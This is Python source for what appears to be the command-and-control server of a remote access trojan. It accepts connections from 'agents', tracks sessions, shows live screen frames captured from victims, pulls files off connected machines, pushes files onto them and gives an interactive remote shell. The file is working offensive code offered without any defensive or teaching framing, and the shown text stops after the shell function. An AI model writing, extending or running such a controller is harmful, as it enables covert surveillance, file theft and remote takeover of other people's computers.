```python
#!/usr/bin/env python3
# server.py — reverse-channel controller, listens on own host
import base64, json, os, shlex, socket, struct, threading, time, uuid
from queue import Queue, Empty

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 4443
FRAME_DIR = "frames"

try:
    import cv2
    import numpy as np
    HAS_CV = True
except Exception:
    HAS_CV = False
    np = None

SESSIONS = {}
ACTIVE = None
VIEW_ON = False


def pack(obj):
    raw = json.dumps(obj).encode()
    return struct.pack(">I", len(raw)) + raw


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return buf


def recv_msg(sock):
    (n,) = struct.unpack(">I", recv_exact(sock, 4))
    return json.loads(recv_exact(sock, n))


class Session:
    def __init__(self, sock, addr):
        self.id = uuid.uuid4().hex[:6]
        self.sock = sock
        self.addr = addr
        self.q = Queue()
        self.alive = True
        self.meta = {}
        self.frame = None
        self.flock = threading.Lock()
        self.wlock = threading.Lock()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        try:
            while True:
                m = recv_msg(self.sock)
                t = m.get("type")
                if t == "frame":
                    with self.flock:
                        self.frame = base64.b64decode(m["data"])
                elif t == "hello":
                    self.meta = m
                else:
                    self.q.put(m)
        except Exception:
            pass
        self.alive = False

    def send(self, obj):
        with self.wlock:
            self.sock.sendall(pack(obj))

    def wait(self, sid, timeout=30, collect=False):
        """wait for a message whose id == sid; collect=True gathers all chunks first"""
        deadline = time.time() + timeout
        chunks = []
        while True:
            remain = deadline - time.time()
            if remain <= 0:
                raise TimeoutError(f"timeout waiting {sid}")
            try:
                m = self.q.get(timeout=remain)
            except Empty:
                raise TimeoutError(f"timeout waiting {sid}")
            if m.get("id") != sid:
                continue  # stale / foreign msg
            if collect and m.get("type") == "chunk":
                chunks.append(m)
                continue
            return m, chunks

    def rpc(self, obj, timeout=30, collect=False):
        obj = dict(obj)
        obj["id"] = uuid.uuid4().hex[:8]
        self.send(obj)
        return self.wait(obj["id"], timeout, collect)


def viewer_loop():
    os.makedirs(FRAME_DIR, exist_ok=True)
    last = None
    while True:
        s = ACTIVE
        if VIEW_ON and s and s.alive:
            with s.flock:
                f = s.frame
            if f and f is not last:
                last = f
                if HAS_CV:
                    arr = cv2.imdecode(np.frombuffer(f, np.uint8), cv2.IMREAD_COLOR)
                    if arr is not None:
                        try:
                            cv2.imshow("screen " + s.id, arr)
                            cv2.waitKey(1)
                        except Exception:
                            cv2.imwrite(os.path.join(FRAME_DIR, f"{int(time.time()*1000)}.jpg"), arr)
                else:
                    with open(os.path.join(FRAME_DIR, f"{int(time.time()*1000)}.jpg"), "wb") as fh:
                        fh.write(f)
        time.sleep(0.02)


def accept_loop():
    global ACTIVE
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[+] listening on {LISTEN_HOST}:{LISTEN_PORT}")
    while True:
        c, addr = srv.accept()
        c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s = Session(c, addr)
        SESSIONS[s.id] = s
        ACTIVE = s
        print(f"[+] agent {s.id} from {addr[0]}:{addr[1]}")


def need():
    global ACTIVE
    s = ACTIVE
    if s is None or not s.alive:
        print("[-] no active agent — 用 sessions / use <id>")
        return None
    return s


def do_dl(s, remote, local):
    try:
        m, chunks = s.rpc({"cmd": "download", "path": remote}, timeout=600, collect=True)
    except Exception as e:
        print("[-]", e)
        return
    if not m.get("ok"):
        print("[-]", m.get("err"))
        return
    chunks.sort(key=lambda c: c.get("seq", 0))
    with open(local, "wb") as fh:
        for c in chunks:
            fh.write(base64.b64decode(c["data"]))
    print(f"[+] {remote} -> {local} ({m.get('bytes', 0)} bytes)")


def do_ul(s, local, remote):
    with open(local, "rb") as fh:
        data = fh.read()
    sid = uuid.uuid4().hex[:8]
    CH = 512 * 1024
    total = max(1, (len(data) + CH - 1) // CH)
    for i in range(total):
        chunk = data[i * CH:(i + 1) * CH]
        s.send({
            "cmd": "upload", "id": sid, "path": remote, "seq": i,
            "total": total, "eof": (i == total - 1),
            "data": base64.b64encode(chunk).decode(),
        })
    try:
        m, _ = s.wait(sid, timeout=600)
        print("[+]" if m.get("ok") else "[-]", f"uploaded {local} -> {remote}",
              "" if m.get("ok") else m.get("err"))
    except Exception as e:
        print("[-]", e)


def do_term(s):
    print("[*] interactive shell — 输入命令，exit 返回")
    while True:
        try:
            line = input("sh> ").strip()
        except EOFError:
            break
        if line in ("exit", "quit", ""):
            if line == "":
                continue
            break
        try:
            m, _ = s.rpc({"cmd": "shell", "run": line}, timeout=120)
            print(m.get("out", ""))
        except Exception as e:
            print("[-]", e)
            break


